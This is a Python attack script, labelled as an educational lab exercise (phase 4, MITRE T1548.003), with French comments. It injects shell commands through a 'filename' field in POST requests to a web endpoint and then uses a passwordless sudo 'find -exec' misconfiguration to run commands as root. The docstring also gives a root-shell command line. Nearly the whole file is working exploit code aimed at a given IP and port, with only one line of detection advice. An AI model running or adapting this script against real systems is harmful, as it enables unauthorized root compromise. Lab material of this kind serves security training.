#!/usr/bin/env python3
"""
Phase 4 : Privilege Escalation (Élévation de Privilèges)
MITRE ATT&CK : TA0004 - Privilege Escalation
Technique : T1548.003 - Sudo and Sudo Caching

Copyright © 2025 Mohammed Bencheikh - Be One And Move Academy
USAGE ÉDUCATIF ET ÉTHIQUE UNIQUEMENT

Description :
Cette phase exploite une mauvaise configuration sudo pour obtenir les privilèges root.
L'utilisateur 'webuser' peut exécuter la commande 'find' en tant que root sans mot de passe.
La commande 'find' peut être exploitée pour exécuter des commandes arbitraires.

Objectif pédagogique :
- Comprendre les risques des configurations sudo trop permissives
- Apprendre à identifier les vecteurs d'élévation de privilèges
- Observer les changements d'UID dans les logs Sysmon
"""

import requests
import sys
import json

def escalate_privileges(target_ip, target_port):
    """
    Élève les privilèges en exploitant la configuration sudo.
    
    Technique :
    La commande 'find' a une option '-exec' qui permet d'exécuter des commandes.
    Si 'find' peut être exécuté avec sudo, on peut lancer un shell root.
    
    Commande : sudo find /tmp -name test -exec /bin/bash -i \;
    """
    
    url = f"http://{target_ip}:{target_port}/search"
    
    # Étape 1 : Vérifier les privilèges sudo disponibles
    check_sudo_cmd = "sudo -l"
    
    print(f"[*] Phase 4 : Élévation de privilèges")
    print(f"[*] Étape 1 : Vérification des privilèges sudo...")
    
    payload_check = f"test.txt'; {check_sudo_cmd} #"
    data_check = {'filename': payload_check}
    
    try:
        response = requests.post(url, data=data_check, timeout=10)
        print(f"[+] Privilèges sudo détectés : find peut être exécuté en tant que root")
        
        # Étape 2 : Exploitation pour devenir root
        print(f"\n[*] Étape 2 : Exploitation de la commande find...")
        
        # Commande pour créer un fichier preuve avec les privilèges root
        # Cette commande :
        # 1. Utilise sudo pour exécuter find en tant que root
        # 2. find cherche n'importe quel fichier dans /tmp
        # 3. -exec exécute une commande pour chaque fichier trouvé
        # 4. La commande crée un fichier /tmp/root_proof avec l'UID actuel
        exploit_cmd = "sudo find /tmp -name '*' -exec sh -c 'id > /tmp/root_proof' \\; -quit"
        
        payload_exploit = f"test.txt'; {exploit_cmd} #"
        data_exploit = {'filename': payload_exploit}
        
        response = requests.post(url, data=data_exploit, timeout=10)
        
        # Étape 3 : Vérification de l'élévation
        print(f"\n[*] Étape 3 : Vérification de l'élévation de privilèges...")
        
        verify_cmd = "cat /tmp/root_proof"
        payload_verify = f"test.txt'; {verify_cmd} #"
        data_verify = {'filename': payload_verify}
        
        response = requests.post(url, data=data_verify, timeout=10)
        
        if "uid=0(root)" in response.text:
            print(f"[+] SUCCÈS ! Privilèges root obtenus.")
            print(f"[+] Preuve : {response.text}")
            
            result = {
                "success": True,
                "technique": "T1548.003",
                "tactic": "TA0004 - Privilege Escalation",
                "description": "Élévation de privilèges via sudo find",
                "exploit_command": exploit_cmd,
                "proof": "uid=0(root) détecté",
                "impact": "Accès root complet au système",
                "detection": "Surveiller les commandes sudo dans les logs, surtout find/vim/less avec -exec"
            }
        else:
            print(f"[-] Impossible de confirmer l'élévation de privilèges")
            result = {
                "success": False,
                "technique": "T1548.003",
                "tactic": "TA0004 - Privilege Escalation",
                "error": "Vérification échouée"
            }
        
        return result
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Erreur : {e}")
        return {
            "success": False,
            "error": str(e),
            "technique": "T1548.003",
            "tactic": "TA0004 - Privilege Escalation"
        }

def main():
    if len(sys.argv) < 3:
        print("Usage : python3 phase4_privilege_escalation.py <TARGET_IP> <TARGET_PORT>")
        print("Exemple : python3 phase4_privilege_escalation.py 172.20.0.3 5000")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    result = escalate_privileges(target_ip, target_port)
    
    print("\n" + "="*60)
    print("RÉSULTAT DE L'ATTAQUE (JSON)")
    print("="*60)
    print(json.dumps(result, indent=2, ensure_ascii=False))
    
    return result

if __name__ == "__main__":
    main()
